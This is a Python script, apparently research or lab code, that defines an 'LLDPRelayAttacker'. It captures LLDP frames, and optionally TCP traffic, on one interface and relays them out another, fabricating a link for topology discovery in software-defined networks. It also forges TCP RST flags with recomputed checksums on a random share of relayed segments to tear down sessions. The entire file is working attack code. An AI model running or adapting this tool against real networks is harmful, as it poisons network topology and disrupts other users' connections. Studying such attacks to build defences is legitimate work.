import pcap
import dpkt
import random
import struct 
from optparse import OptionParser

class LLDPRelayAttacker(object):
    '''
    bind_iface: the binding interface to sniff LLDP packets.
    relay_ends: relay the LLDP to the ends through UDP sockets. 
    '''
    def __init__(self, in_dev, out_dev, fwd_all):
        self._init_pcap(in_dev, out_dev, fwd_all)
        self.rst_rate = 0.05

    def _init_pcap(self, in_dev, out_dev, fwd_all):
        
        self.in_handler = pcap.pcap(in_dev, promisc=False, immediate=True, timeout_ms=50)
        self.in_handler.setdirection(pcap.PCAP_D_IN)
        if not int(fwd_all):
            filter_strategy = 'ether proto 0x88cc'
        else:
            filter_strategy = 'tcp or (ether proto 0x88cc) or tcp port 9527 or \
                (not ether dst host ff:ff:ff:ff:ff:ff and \
                 not ether src host 00:00:de:ad:be:ef)'
        self.in_handler.setfilter(filter_strategy)
        self.out_handler = pcap.pcap(out_dev)

    def reset_session(self, eth):
        if not isinstance(eth.data, dpkt.ip.IP):
            return None 
        ip = eth.data
        if not isinstance(ip.data, dpkt.tcp.TCP):
            return None
        if random.random() > self.rst_rate:
            return None
        tcp = ip.data
        # set rst flag
        tcp.flags |= dpkt.tcp.TH_RST 
        # recalculate TCP checksum
        tcp.data = b'RST Attack!'
        pseudo_hdr = struct.pack('!4s4sHH', ip.src, ip.dst, ip.p, len(tcp))
        tcp.sum = 0
        tcp.sum = dpkt.in_cksum(pseudo_hdr + tcp.pack())
        # recalculate IP len and checksum
        ip.len = ip.hl * 4 + len(tcp)
        ip.sum = 0
        ip.sum = dpkt.in_cksum(ip.pack_hdr())
        return eth.pack()
         
    def _loop_capture(self, pcap_handler):
        for _, pdata in pcap_handler:
            eth = dpkt.ethernet.Ethernet(pdata)
            reset_data = self.reset_session(eth)
            if reset_data:
                pdata = reset_data
            self.out_handler.sendpacket(pdata)

    def run(self):
        try:
            self._loop_capture(self.in_handler)
        except KeyboardInterrupt:
            return 

        
if __name__ == '__main__':
    prompt = '''usage: %prog  -i in_dev ip -o out_dev'''
    parser = OptionParser(usage=prompt)
    parser.add_option('-i', '--in', dest='in_dev')
    parser.add_option('-o', '--out', dest='out_dev')
    parser.add_option('-a', '--all', dest='fwd_all', type="int", default=False)
    (options, args) = parser.parse_args()

    relay_attacker = LLDPRelayAttacker(options.in_dev, options.out_dev, options.fwd_all)
    relay_attacker.run()